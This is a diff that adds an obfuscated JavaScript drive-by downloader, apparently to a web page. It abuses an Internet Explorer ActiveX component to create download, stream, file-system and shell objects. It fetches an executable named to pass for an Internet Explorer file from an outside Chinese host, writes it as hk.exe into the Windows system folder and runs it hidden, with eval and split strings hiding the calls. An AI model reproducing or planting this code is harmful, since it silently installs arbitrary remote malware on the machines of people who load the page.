@@ -1,0 +1,22 @@
+ var    filename="hk.exe"    
+var    url="
+http://www.topfa.cn/ie/down/IEXPLORERE.exe";    
+var    obj=document.createElement("object");
+obj.setAttribute("classid","clsid:BD96C556-65A3-11D0-983A-00C04FC29E36");
+var    str="Microsoft.XMLHTTP";    
+var    xmlhttp    =    obj.CreateObject(str,"");
+var    adob=obj.createobject("AD"+"OD"+"B.Stream","");
+adob.Type=1;
+eval('xmlhttp.op'+'en("GET",url,false)');
+eval("xmlh"+"ttp.send()");
+eval("adob.Op"+"en()");
+var    f    =    obj.createobject("Scripting.FileSystemObject","");
+var    fname=filename;    
+var    tmp    =    f.GetSpecialFolder(1);
+fname=f.BuildPath(tmp,fname);
+eval("adob.w"+"rite(xmlhtt"+"p.respo"+"nseBody)");    
+adob.SaveToFile(fname,2);
+adob.Close();
+var    runc    =    obj.createobject("She"+"ll.Appl"+"ication","");    
+eval('runc.She'+'llExe'+'cute(fname,"","","open",0)');
+
